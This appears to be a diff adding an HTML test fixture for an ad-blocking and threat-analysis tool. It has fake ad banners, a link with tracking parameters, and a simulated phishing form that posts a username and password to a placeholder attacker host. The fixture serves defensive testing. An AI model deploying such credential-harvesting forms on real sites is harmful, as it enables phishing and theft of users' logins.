@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>AUVYQ Test Page — Safe Local Fixture</title>
+  <style>
+    body { font-family: sans-serif; padding: 20px; line-height: 1.5; }
+    .box { border: 1px solid #ccc; padding: 15px; margin-bottom: 20px; border-radius: 8px; }
+    .ad-banner { background: #ffebee; border: 1px dashed #c62828; padding: 20px; text-align: center; }
+    #promo { background: #fff3e0; border: 1px dashed #ef6c00; padding: 20px; text-align: center; }
+  </style>
+</head>
+<body>
+  <h1>AUVYQ Test Page</h1>
+  <p>This harmless test page contains representative elements for ad blocking, cosmetic filtering, tracking parameters, and threat analysis testing.</p>
+
+  <!-- Cosmetic Filtering Test Targets -->
+  <div class="box">
+    <h2>Cosmetic Filtering Targets</h2>
+    <div class="ad-banner">
+      <strong>[Fake Ad Banner (.ad-banner)]</strong> — This should be hidden by cosmetic rules.
+    </div>
+    <div id="promo" style="margin-top: 10px;">
+      <strong>[Fake Promo Banner (#promo)]</strong> — This should be hidden by cosmetic rules.
+    </div>
+  </div>
+
+  <!-- Tracking Link Fixture -->
+  <div class="box">
+    <h2>Tracking URL Parameters</h2>
+    <p>
+      <a id="track-link" href="https://example.com/landing?utm_source=test_newsletter&utm_medium=email&utm_campaign=spring_sale&fbclid=IwAR1234567890&gclid=Cj0KCQj12345">
+        Test link with UTM, Facebook and Google tracking parameters
+      </a>
+    </p>
+  </div>
+
+  <!-- Safe Local Login Form -->
+  <div class="box">
+    <h2>Normal Same-Origin Login Form</h2>
+    <form action="/login-handler" method="POST">
+      <label>Email: <input type="email" name="email" value="user@example.com"></label><br><br>
+      <label>Password: <input type="password" name="password" value="password123"></label><br><br>
+      <button type="submit">Log In</button>
+    </form>
+  </div>
+
+  <!-- Suspicious Foreign-Origin Login Form -->
+  <div class="box" style="border-color: #f44336;">
+    <h2>Suspicious Foreign-Origin Login Form (Phishing Simulation)</h2>
+    <form action="https://attacker-harvesting-credentials.example/collect" method="POST">
+      <label>Username: <input type="text" name="user" value="victim"></label><br><br>
+      <label>Password: <input type="password" name="pwd" value="secret"></label><br><br>
+      <button type="submit">Submit to Untrusted Origin</button>
+    </form>
+  </div>
+
+  <script>
+    // Harmless offline tracking simulation for test verification
+    window.addEventListener('DOMContentLoaded', () => {
+      console.log('AUVYQ test page loaded cleanly.');
+    });
+  </script>
+</body>
+</html>
